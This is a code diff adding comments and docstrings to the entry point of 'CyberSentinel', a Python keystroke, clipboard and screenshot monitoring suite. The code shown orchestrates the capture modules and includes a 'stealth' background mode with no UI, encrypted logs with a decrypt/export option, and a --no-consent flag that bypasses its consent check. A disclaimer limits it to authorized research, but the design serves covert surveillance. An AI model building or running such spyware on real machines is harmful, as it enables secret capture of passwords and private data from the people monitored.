@@ -1,14 +1,38 @@
+"""
+CyberSentinel - Ethical Keystroke Monitoring Suite
+====================================================
+Main application entry point.
+
+Usage:
+    python main.py                     # Interactive mode
+    python main.py --mode monitor      # Live monitoring dashboard
+    python main.py --mode stealth      # Background monitoring (no UI)
+    python main.py --mode review       # Review log files
+    python main.py --mode sysinfo      # Display system information
+    python main.py --mode decrypt      # Decrypt and export logs
+    python main.py --mode test         # Run self-tests
+
+⚠️  DISCLAIMER: This tool is for AUTHORIZED cybersecurity
+    research and education ONLY. Unauthorized use is illegal.
+"""
+
 import sys
 import argparse
 import signal
 import time
 from datetime import datetime
 
+# pyrefly: ignore [missing-import]
 from rich.console import Console
+# pyrefly: ignore [missing-import]
 from rich.prompt import Prompt
+# pyrefly: ignore [missing-import]
 from rich.panel import Panel
+# pyrefly: ignore [missing-import]
 from rich.text import Text
+# pyrefly: ignore [missing-import]
 from rich.align import Align
+# pyrefly: ignore [missing-import]
 from rich import box
 
 from config.settings import (
@@ -41,7 +65,9 @@ from ui.dashboard import Dashboard
 
 console = Console()
 
+
 def parse_arguments():
+    """Parse command-line arguments."""
     parser = argparse.ArgumentParser(
         description=f"{APP_NAME} - {APP_TAGLINE}",
         formatter_class=argparse.RawDescriptionHelpFormatter,
@@ -78,7 +104,9 @@ def parse_arguments():
     )
     return parser.parse_args()
 
+
 def show_interactive_menu() -> str:
+    """Display the interactive mode selection menu."""
     menu = Text()
     menu.append("\n")
     menu.append("  ┌─────────────────────────────────────────┐\n", style=THEME_PRIMARY)
@@ -138,7 +166,10 @@ def show_interactive_menu() -> str:
     except (KeyboardInterrupt, EOFError):
         return "exit"
 
+
 def run_monitor_mode(args):
+    """Run the live monitoring dashboard mode."""
+    # Initialize components
     crypto = EncryptionManager()
     keylogger = KeystrokeEngine(encryption_manager=crypto)
     clipboard = ClipboardMonitor(encryption_manager=crypto) if not args.no_clipboard else None
@@ -170,12 +201,14 @@ def run_monitor_mode(args):
         console.print(f"  📊 Total keystrokes: {stats['total_keystrokes']:,}")
         console.print(f"  📁 Log: {stats['log_file']}\n")
 
+    # Setup graceful shutdown
     def signal_handler(sig, frame):
         shutdown()
         sys.exit(0)
 
     signal.signal(signal.SIGINT, signal_handler)
 
+    # Start all modules
     console.print(f"\n  [bold {THEME_ACCENT}]🚀 Starting monitoring modules...[/]")
     keylogger.start()
     console.print(f"    [bold {THEME_ACCENT}]✓[/] Keystroke engine started")
@@ -192,6 +225,7 @@ def run_monitor_mode(args):
     console.print(f"  [dim]Press Ctrl+C to stop monitoring[/]\n")
     time.sleep(1)
 
+    # Start dashboard
     try:
         dashboard.start_live_monitor()
     except KeyboardInterrupt:
@@ -199,12 +233,15 @@ def run_monitor_mode(args):
     finally:
         shutdown()
 
+
 def run_stealth_mode(args):
+    """Run background monitoring without UI."""
     crypto = EncryptionManager()
     keylogger = KeystrokeEngine(encryption_manager=crypto)
     clipboard = ClipboardMonitor(encryption_manager=crypto) if not args.no_clipboard else None
     screenshot = ScreenshotCapture() if not args.no_screenshot else None
 
+    # Setup graceful shutdown
     def signal_handler(sig, frame):
         keylogger.stop()
         if clipboard:
@@ -221,6 +258,7 @@ def run_stealth_mode(args):
 
     signal.signal(signal.SIGINT, signal_handler)
 
+    # Start modules
     keylogger.start()
     if clipboard:
         clipboard.start()
@@ -244,36 +282,46 @@ def run_stealth_mode(args):
         )
     )
 
+    # Keep running
     try:
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
         signal_handler(None, None)
 
+
 def run_review_mode(args):
+    """Review log files."""
     crypto = EncryptionManager()
     file_handler = FileHandler(encryption_manager=crypto)
     dashboard = Dashboard()
     dashboard.show_log_review(file_handler)
 
+
 def run_sysinfo_mode(args):
+    """Display system information."""
     profiler = SystemProfiler()
     dashboard = Dashboard()
     dashboard.show_system_info(profiler)
 
+
 def run_decrypt_mode(args):
+    """Decrypt and export logs."""
     crypto = EncryptionManager()
     file_handler = FileHandler(encryption_manager=crypto)
     dashboard = Dashboard(encryption=crypto)
     dashboard.show_decrypt_menu(file_handler)
 
+
 def run_tests(args):
+    """Run self-diagnostic tests."""
     import unittest
 
     console.print(
         f"\n  [bold {THEME_PRIMARY}]🧪 Running CyberSentinel Self-Tests...[/]\n"
     )
 
+    # Discover and run tests
     loader = unittest.TestLoader()
     suite = loader.discover("tests", pattern="test_*.py")
     runner = unittest.TextTestRunner(verbosity=2)
@@ -288,12 +336,16 @@ def run_tests(args):
             f"\n  [bold {THEME_ERROR}]❌ Some tests failed. See output above.[/]\n"
         )
 
+
 def main():
+    """Main application entry point."""
     args = parse_arguments()
 
+    # Show banner
     dashboard = Dashboard()
     dashboard.show_banner()
 
+    # Determine mode
     mode = args.mode
     if mode is None:
         mode = show_interactive_menu()
@@ -302,6 +354,7 @@ def main():
         console.print(f"\n  [bold {THEME_PRIMARY}]👋 Goodbye![/]\n")
         sys.exit(0)
 
+    # Consent check for monitoring modes
     if mode in ("monitor", "stealth") and not args.no_consent:
         consent = ConsentManager()
         if not consent.request_consent():
@@ -310,6 +363,7 @@ def main():
             )
             sys.exit(1)
 
+    # Route to selected mode
     mode_handlers = {
         "monitor": run_monitor_mode,
         "stealth": run_stealth_mode,
@@ -325,6 +379,7 @@ def main():
     else:
         console.print(f"  [bold {THEME_ERROR}]Unknown mode: {mode}[/]")
         sys.exit(1)
+
 
 if __name__ == "__main__":
     main()
